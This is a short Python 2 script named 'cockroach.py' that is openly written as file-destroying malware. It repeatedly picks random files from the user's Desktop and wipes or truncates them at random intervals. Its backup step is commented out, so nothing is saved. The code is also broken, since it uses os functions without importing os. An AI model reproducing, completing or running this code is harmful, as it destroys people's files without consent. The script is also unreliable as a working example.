#!/c/Python27/python.exe
#cockroach.py - nom nom nom files sure are tasty
#0xicl33n
from os import system
import random
import time
from random import randint
from time import sleep
from binascii import unhexlify
import dircache
import shutil
from threading import Thread
random.seed()
import threading
sysc = os.system
ourUser = os.getenv('username')
mainPid = os.getpid()
ourFolder = "C:\\Users\\" + ourUser + "\\Desktop"
spawnCount = 1
bak = "C:\\Users\\" + ourUser + "\\Documents\\safebak"
#print bak
sysc('mkdir ' + bak ) 

def getRandomfile(): # returns a random file from the users desktop
	dircache.reset()
	thisFile = ourFolder  + "\\" + random.choice(dircache.listdir(ourFolder))
	return thisFile

def munch(file): # main munch function
	chewThis = random.randint(1,1337) * 10
	#sysc('copy ' + file + '\t' + bak + '\\')
	#print 'copy ' + file + '\t' + bak + '\\'
	print "[@]DEBUG: IMMA MUNCH THIS:",file 
	print "[@]DEBUG: IMMA EAT",chewThis,'BYTES'
	with open(file, 'w+') as fdest:
        	fdest.seek(chewThis, os.SEEK_END)
        	fdest.truncate(chewThis)
        	#print "[@]DEBUG: NOM NOM TASTY FILES"

def getTime(): # will munch at this interval
	thisTime = randint(60,600) # 1 minute through 10 minute(s)
	return thisTime

def run(): # the guts before the guts
	try:
		datFile = getRandomfile()
		if "ini" in datFile:
			datFile = getRandomfile()
			munch(datFile)
			main()
		else:
			munch(datFile)
			main()
	except IOError, e: # handle that stupid ini error, yes!
		#print e
		main()

def main(): # the guts
	while 1:
		sleep(5)
		print "[@]DEBUG: HAY I AM",mainPid
		print "[@]DEBUG: IMMA SLEEP FOR",getTime(), 'SECONDS'
		thisTime = getTime()
		run()
main()